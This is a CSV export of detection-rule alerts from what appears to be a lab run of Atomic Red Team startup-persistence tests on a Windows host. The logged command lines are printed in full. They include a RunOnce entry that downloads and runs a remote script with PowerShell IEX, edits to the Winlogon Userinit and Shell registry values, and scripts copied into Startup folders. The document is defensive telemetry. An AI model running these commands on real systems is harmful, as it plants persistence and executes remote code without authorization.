"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-26 11:18:55.812 +01:00","Startup Folder File Write","med","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173588,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400","CreationUtcTime: 2025-12-26 10:18:55.809 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.811","file_event_win_startup_folder_file_write.yml","daaf04a9-5b60-e331-6611-a3a32797e550","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.601 +01:00","Startup Folder File Write","med","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173595,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.599 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.599","file_event_win_startup_folder_file_write.yml","daaf04a9-5b60-e331-6611-a3a32797e550","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.603 +01:00","Startup Folder File Write","med","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173597,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.599 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.601","file_event_win_startup_folder_file_write.yml","daaf04a9-5b60-e331-6611-a3a32797e550","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.610 +01:00","Startup Folder File Write","med","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173599,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.605 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.607","file_event_win_startup_folder_file_write.yml","daaf04a9-5b60-e331-6611-a3a32797e550","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.621 +01:00","Startup Folder File Write","med","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173601,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.605 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.613","file_event_win_startup_folder_file_write.yml","daaf04a9-5b60-e331-6611-a3a32797e550","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:06.507 +01:00","Startup Folder File Write","med","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173607,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5588 ¦ PGUID: E9F06A57-6119-694E-8301-000000002400","CreationUtcTime: 2025-12-26 10:19:06.506 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:06.506","file_event_win_startup_folder_file_write.yml","daaf04a9-5b60-e331-6611-a3a32797e550","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.428 +01:00","Suspicious Startup Folder Persistence","high","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Exec ¦ Persis","T1204.002 ¦ T1547.001","sysmon",173570,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400","CreationUtcTime: 2025-12-26 10:18:54.425 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.425","file_event_win_susp_startup_folder_persistence.yml","42eda6ab-d3b1-98fa-2f6a-5ff1382daca6","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.434 +01:00","Suspicious Startup Folder Persistence","high","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Exec ¦ Persis","T1204.002 ¦ T1547.001","sysmon",173574,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400","CreationUtcTime: 2025-12-26 10:18:54.433 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.433","file_event_win_susp_startup_folder_persistence.yml","42eda6ab-d3b1-98fa-2f6a-5ff1382daca6","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.803 +01:00","Suspicious Startup Folder Persistence","high","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Exec ¦ Persis","T1204.002 ¦ T1547.001","sysmon",173582,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400","CreationUtcTime: 2025-12-26 10:18:55.802 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.802","file_event_win_susp_startup_folder_persistence.yml","42eda6ab-d3b1-98fa-2f6a-5ff1382daca6","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.812 +01:00","Suspicious Startup Folder Persistence","high","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Exec ¦ Persis","T1204.002 ¦ T1547.001","sysmon",173586,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400","CreationUtcTime: 2025-12-26 10:18:55.809 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.809","file_event_win_susp_startup_folder_persistence.yml","42eda6ab-d3b1-98fa-2f6a-5ff1382daca6","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.601 +01:00","Suspicious Startup Folder Persistence","high","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Exec ¦ Persis","T1204.002 ¦ T1547.001","sysmon",173595,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.599 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.599","file_event_win_susp_startup_folder_persistence.yml","42eda6ab-d3b1-98fa-2f6a-5ff1382daca6","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.610 +01:00","Suspicious Startup Folder Persistence","high","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Exec ¦ Persis","T1204.002 ¦ T1547.001","sysmon",173599,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.605 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.607","file_event_win_susp_startup_folder_persistence.yml","42eda6ab-d3b1-98fa-2f6a-5ff1382daca6","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:16.429 +01:00","System Information Discovery via Registry Queries","low","DESKTOP-G2OBL3D","Sysmon",1,"Disc","T1082","sysmon",173629,"Cmdline: ""powershell.exe"" & {$oldvalue = $(Get-ItemPropertyValue -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit\""""); Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit-backup\"""" -Value \""""$oldvalue\""""; $newvalue = $oldvalue + \"""" C:\Windows\System32\calc.exe\""""; Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit\"""" -Value \""""$newvalue\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 6056 ¦ PGUID: E9F06A57-6124-694E-9601-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$oldvalue = $(Get-ItemPropertyValue -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit\""""); Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit-backup\"""" -Value \""""$oldvalue\""""; $newvalue = $oldvalue + \"""" C:\Windows\System32\calc.exe\""""; Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit\"""" -Value \""""$newvalue\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:16.419","proc_creation_win_discovery_via_reg_queries.yml","171d769f-2110-367f-ead2-6d7a7afd0c46","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:17.103 +01:00","System Information Discovery via Registry Queries","low","DESKTOP-G2OBL3D","Sysmon",1,"Disc","T1082","sysmon",173633,"Cmdline: ""powershell.exe"" & {$oldvalue = $(Get-ItemPropertyValue -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell\""""); Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell-backup\"""" -Value \""""$oldvalue\""""; $newvalue = $oldvalue + \"""", C:\Windows\explorer.exe\""""; Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell\"""" -Value \""""$newvalue\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1448 ¦ PGUID: E9F06A57-6125-694E-9801-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$oldvalue = $(Get-ItemPropertyValue -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell\""""); Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell-backup\"""" -Value \""""$oldvalue\""""; $newvalue = $oldvalue + \"""", C:\Windows\explorer.exe\""""; Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell\"""" -Value \""""$newvalue\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:17.088","proc_creation_win_discovery_via_reg_queries.yml","171d769f-2110-367f-ead2-6d7a7afd0c46","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:44.301 +01:00","Suspicious Execution of Hostname","low","DESKTOP-G2OBL3D","Sysmon",1,"Disc","T1082","sysmon",173556,"Cmdline: ""C:\WINDOWS\system32\HOSTNAME.EXE"" ¦ Proc: C:\Windows\System32\HOSTNAME.EXE ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1252 ¦ PGUID: E9F06A57-6104-694E-6701-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Hostname APP ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=0411E7CFE0D452AFE541C1EA45033168,SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9,IMPHASH=8CB84C534505B1E47EF25FA2CD9A16BB","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2161 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: hostname.exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:44.297","proc_creation_win_hostname_execution.yml","cd4f18d8-b261-1a76-2600-f039cd6f0310","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:49.928 +01:00","PowerShell Download and Execution Cradles","high","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059","sysmon",173564,"Cmdline: ""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\"""" set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 6384 ¦ PGUID: E9F06A57-6109-694E-6F01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\"""" set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:49.675","proc_creation_win_powershell_download_iex.yml","745811d2-f9b3-6c05-f1f8-b245b4d26b9f","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:49.928 +01:00","PowerShell Download Pattern","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",173564,"Cmdline: ""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\"""" set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 6384 ¦ PGUID: E9F06A57-6109-694E-6F01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\"""" set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:49.675","proc_creation_win_powershell_download_patterns.yml","9c070b47-5e34-6e96-ccce-205111752ae3","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:49.928 +01:00","Suspicious PowerShell Invocations - Specific - ProcessCreation","med","DESKTOP-G2OBL3D","Sysmon",1,"Evas","","sysmon",173564,"Cmdline: ""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\"""" set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 6384 ¦ PGUID: E9F06A57-6109-694E-6F01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\"""" set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:49.675","proc_creation_win_powershell_invocation_specific.yml","e554e422-7cda-2292-0e64-7595a12743dd","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:49.928 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",173564,"Cmdline: ""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\"""" set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 6384 ¦ PGUID: E9F06A57-6109-694E-6F01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\"""" set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:49.675","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:53.961 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",173568,"Cmdline: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\"""" cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\"""" cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:53.942","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\art_1547_001.evtx"
